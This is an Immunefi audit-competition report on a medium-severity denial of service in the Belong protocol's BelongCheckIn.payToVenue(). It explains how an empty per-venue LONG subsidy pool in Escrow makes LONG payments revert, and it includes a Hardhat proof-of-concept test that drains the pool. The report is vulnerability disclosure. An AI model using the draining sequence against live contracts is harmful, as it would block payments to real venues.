# 57060 sc medium unconditional subsidy withdrawal in paytovenue leads to dos when venue s long pool is depleted

**Submitted on Oct 23rd 2025 at 06:46:41 UTC by @cholakovvv for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57060
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/BelongCheckIn.sol>
* **Impacts:** Smart contract unable to operate due to lack of token funds

## Description

### Brief/Intro

`BelongCheckIn.payToVenue()` always attempts to withdraw a per-venue LONG subsidy from `Escrow` before delivering funds. When the venue’s LONG subsidy bucket (`Escrow.venueDeposits[venue].longDeposits`) is depleted, this withdrawal reverts, making all LONG payments for that venue fail until the venue redeposits (and pays the convenience fee again). USDC payments still work, but the LONG path is bricked, creating a venue-level denial of service that can occur naturally with usage or be forced cheaply by an adversary.

### Vulnerability Details

When a customer pays a venue in LONG, the contract first calculates a subsidy amount derived from the platform’s configuration and attempts to withdraw it from the venue’s LONG pool in `Escrow`. The withdrawn subsidy is then combined with the customer’s own LONG payment to form the total amount transferred or staked for the venue. The subsidy is meant to be sourced from the venue’s previously deposited LONG balance, which is finite and decreases with every LONG payment.

In the LONG payment branch of `BelongCheckIn::payToVenue()`, the function computes the subsidy and immediately requests it from the escrow contract:

```solidity
 } else {
            // platform subsidy - processing fee
            uint256 subsidyMinusFees = _storage
                .fees
                .platformSubsidyPercentage
                .calculateRate(customerInfo.amount) -
                _storage.fees.processingFeePercentage.calculateRate(
                    customerInfo.amount
                );
            _storage.contracts.escrow.distributeLONGDiscount(
                customerInfo.venueToPayFor,
                address(this),
                subsidyMinusFees
            );
```

The call to `Escrow::distributeLONGDiscount()` reverts if the venue’s LONG balance is insufficient to cover the requested amount:

```solidity
function distributeLONGDiscount(address venue, address to, uint256 amount) external onlyBelongCheckIn {
        uint256 longDeposits = venueDeposits[venue].longDeposits;
        require(longDeposits >= amount, NotEnoughLONGs(longDeposits, amount));

        unchecked {
            longDeposits -= amount;
        }
        venueDeposits[venue].longDeposits = longDeposits;

        belongCheckIn.paymentsInfo().long.safeTransfer(to, amount);

        emit VenueDepositsUpdated(venue, venueDeposits[venue]);
        emit DistributedLONGDiscount(venue, to, amount);
    }
```

Once the venue’s `longDeposits` reach zero, this `require` statement fails, reverting the entire transaction. There is no fallback behavior to cap the subsidy at the remaining balance, nor to skip subsidy withdrawal entirely when the pool is empty. Because of this, any subsequent LONG payments to the venue will consistently revert until new funds are deposited to replenish its LONG balance in escrow.

This logic makes LONG payments depend entirely on the venue’s available subsidy balance. Once that balance is depleted, every LONG transaction to the venue fails, effectively disabling this payment method until the subsidy is replenished. Meanwhile, USDC payments remain unaffected and continue to work as normal.

### Impact Details

Selected impact: Smart contract unable to operate due to lack of token funds.

Once a venue’s `Escrow.venueDeposits[venue].longDeposits` reaches zero, all subsequent LONG payments to that venue revert with `NotEnoughLONGs`. This disables one of the two accepted payment paths and effectively halts all LONG-based activity for that venue until a redeposit occurs.

The issue can appear naturally after enough LONG payments deplete the subsidy pool or be triggered intentionally by an attacker repeatedly making LONG payments to exhaust the pool (a cheap griefing vector). Although USDC payments remain functional, the protocol fails to deliver on its intended functionality for LONG payments, which makes the LONG payment path unusable for that venue.

## References

* <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/BelongCheckIn.sol#L471C8-L477C102>
* <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/periphery/Escrow.sol#L113C3-L126C6>

## Proof of Concept

<details>

<summary>PoC test (open to expand)</summary>

To reproduce the issue, add the following test case to `belong-check-in.test.ts`, inside the existing test suite. Then, run the test with:

```bash
npx hardhat test test/v2/platform/belong-check-in.test.ts --grep "\[PoC\]" --verbose
```

PoC:

```typescript
describe('Customer flow long payment', () => {
it('[PoC] payToVenue() LONG subsidy depletion causes DoS', async function () {
      const { belongCheckIn, escrow, signer, USDC, ENA, USDC_whale, ENA_whale } = await loadFixture(fixture);
      const chainId = (await ethers.provider.getNetwork()).chainId;

      // Fetch constants
      const tier0 = await belongCheckIn.stakingRewards(0);
      const convenienceFeeAmount = tier0.venueStakingInfo.convenienceFeeAmount;
      const storage = await belongCheckIn.belongCheckInStorage();
      const netSubsidyBps = ethers.BigNumber.from(storage.fees.platformSubsidyPercentage).sub(
        storage.fees.processingFeePercentage,
      );

      // Venue makes tiny deposit to get small LONG pool
      const venue = USDC_whale.address;
      const uri = 'uri';
      const venueAmount = ethers.utils.parseUnits('0.05', 6); // $0.05
      const msg = ethers.utils.solidityKeccak256(
        ['address', 'bytes32', 'string', 'uint256'],
        [venue, ethers.constants.HashZero, uri, chainId],
      );
      const sig = EthCrypto.sign(signer.privateKey, msg);
      const venueInfo = {
        rules: { paymentType: 2, bountyType: 0, longPaymentType: 0 },
        venue,
        amount: venueAmount,
        referralCode: ethers.constants.HashZero,
        uri,
        signature: sig,
      };

      await USDC.connect(USDC_whale).approve(belongCheckIn.address, convenienceFeeAmount.add(venueAmount));
      await belongCheckIn.connect(USDC_whale).venueDeposit(venueInfo);

      const longInEscrow = (await escrow.venueDeposits(venue)).longDeposits;
      console.log('INITIAL STATE');
      console.log('LONG pool:', ethers.utils.formatEther(longInEscrow));

      // Compute payment size so 3 payments consume pool
      const paymentSize = longInEscrow.mul(10_000).div(netSubsidyBps.mul(3));
      const subsidyPerPayment = paymentSize.mul(netSubsidyBps).div(10_000);
      console.log('Payment size:', ethers.utils.formatEther(paymentSize));
      console.log('Subsidy per payment:', ethers.utils.formatEther(subsidyPerPayment));

      // Prepare customer info (LONG payment)
      const cm = ethers.utils.solidityKeccak256(
        ['bool', 'uint128', 'uint24', 'address', 'address', 'address', 'uint256', 'uint256'],
        [false, 0, 0, ENA_whale.address, venue, ethers.constants.AddressZero, paymentSize, chainId],
      );
      const csig = EthCrypto.sign(signer.privateKey, cm);
      const info = {
        paymentInUSDC: false,
        visitBountyAmount: 0,
        spendBountyPercentage: 0,
        customer: ENA_whale.address,
        venueToPayFor: venue,
        promoter: ethers.constants.AddressZero,
        amount: paymentSize,
        signature: csig,
      };

      // 3 successful payments
      for (let i = 0; i < 3; i++) {
        await ENA.connect(ENA_whale).approve(belongCheckIn.address, paymentSize);
        await expect(belongCheckIn.connect(ENA_whale).payToVenue(info)).to.not.be.reverted;

        const current = await escrow.venueDeposits(venue);
        console.log(`Payment ${i + 1}: LONG remaining = ${ethers.utils.formatEther(current.longDeposits)}`);
      }

      const after3 = await escrow.venueDeposits(venue);
      console.log('AFTER 3 PAYMENTS');
      console.log('LONG pool:', ethers.utils.formatEther(after3.longDeposits));
      console.log('Pool depleted:', after3.longDeposits.lt(subsidyPerPayment) ? 'YES' : 'NO');
      expect(after3.longDeposits).to.be.lt(subsidyPerPayment);

      // 4th payment should revert
      console.log('ATTEMPTING 4TH PAYMENT');
      await ENA.connect(ENA_whale).approve(belongCheckIn.address, paymentSize);
      await expect(belongCheckIn.connect(ENA_whale).payToVenue(info)).to.be.reverted;
      console.log('4th payment reverted: DoS CONFIRMED');
    });
  });
});
```

Expected output (example):

```bash
INITIAL STATE
LONG pool: 11.154730921775894517
Payment size: 743.6487281183929678
Subsidy per payment: 3.718243640591964839
Payment 1: LONG remaining = 7.436487281183929678
Payment 2: LONG remaining = 3.718243640591964839
Payment 3: LONG remaining = 0.0
AFTER 3 PAYMENTS
LONG pool: 0.0
Pool depleted: YES
ATTEMPTING 4TH PAYMENT
4th payment reverted: DoS CONFIRMED
      ✔ [PoC] payToVenue() LONG subsidy depletion causes DoS (27449ms)
```

</details>
